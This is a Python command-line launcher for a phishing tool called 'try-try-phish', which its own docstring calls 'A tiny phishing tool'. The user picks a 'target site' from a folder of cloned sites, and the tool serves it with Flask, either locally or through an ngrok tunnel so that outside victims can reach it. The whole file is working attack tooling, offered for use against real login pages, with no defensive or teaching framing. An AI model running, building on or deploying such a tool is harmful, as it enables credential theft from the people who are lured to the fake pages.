import os
import subprocess
import click
import ngrok as ngrokpkg


NAME = "try-try-phish"
VERSION = "v0.1.0"
CREATOR = "Saheb Giri"
ASCII_ART = f"""
 _                _                      _     _     _     
| |_ _ __ _   _  | |_ _ __ _   _   _ __ | |__ (_)___| |__  
| __| '__| | | | | __| '__| | | | | '_ \| '_ \| / __| '_ \ 
| |_| |  | |_| | | |_| |  | |_| | | |_) | | | | \__ \ | | |
 \__|_|   \__, |  \__|_|   \__, | | .__/|_| |_|_|___/_| |_|
          |___/            |___/  |_|                          
                                                     {VERSION}
"""

SITES = os.listdir(os.path.join(os.getcwd(), "sites"))


@click.group()
@click.version_option(VERSION, prog_name=NAME)
def try_try_phish():
    """try-try-phish - A tiny phishing tool"""


@try_try_phish.command()
@click.option(
    "--site",
    "-s",
    type=click.Choice(SITES),
    prompt="Select your target site",
    help="Your target site",
)
@click.option(
    "--port",
    "-p",
    type=int,
    default=8080,
    prompt="Enter a port",
    help="Your localhost port number",
)
def localhost(site, port):
    """Start the local phishing server"""

    server_command = f"flask run --host 0.0.0.0 --port {port} --no-debug"

    try:
        click.echo(
            click.style(
                f"🚀 Starting phishing server on http://127.0.0.1:{port}/{site}",
                bold=True,
            )
        )
        subprocess.run(
            server_command,
            shell=True,
            check=True,
            # text=True,
            # stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
    except subprocess.CalledProcessError as e:
        print(f"Error starting server: {e}")
    except KeyboardInterrupt:
        print("\nServer stopped.")


@try_try_phish.command()
@click.option(
    "--site",
    "-s",
    type=click.Choice(SITES),
    prompt="Select your target site",
    help="Your target site",
)
@click.option(
    "--token",
    "-t",
    type=str,
    prompt="Specify ngrok auth token",
    help="Auth token form ngrok dashboard",
)
@click.option(
    "--port",
    "-p",
    type=int,
    default=8080,
)
def ngrok(site, token, port):
    """Start the local and ngrok phishing server"""

    server_command = f"flask run --host 0.0.0.0 --port {port} --no-debug"

    try:
        listener = ngrokpkg.forward(port, authtoken=token)
        click.echo(
            click.style(
                f"🚀 Starting phishing server on {listener.url()}/{site}",
                bold=True,
            )
        )
        subprocess.run(
            server_command,
            shell=True,
            check=True,
            # text=True,
            # stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
        )
    except subprocess.CalledProcessError as e:
        print(f"Error starting server: {e}")
    except KeyboardInterrupt:
        print("\nServer stopped.")


if __name__ == "__main__":
    click.echo(ASCII_ART)
    click.echo(click.style(" CREATOR ", bg="green", bold=True) + f" {CREATOR} \n")

    try_try_phish()
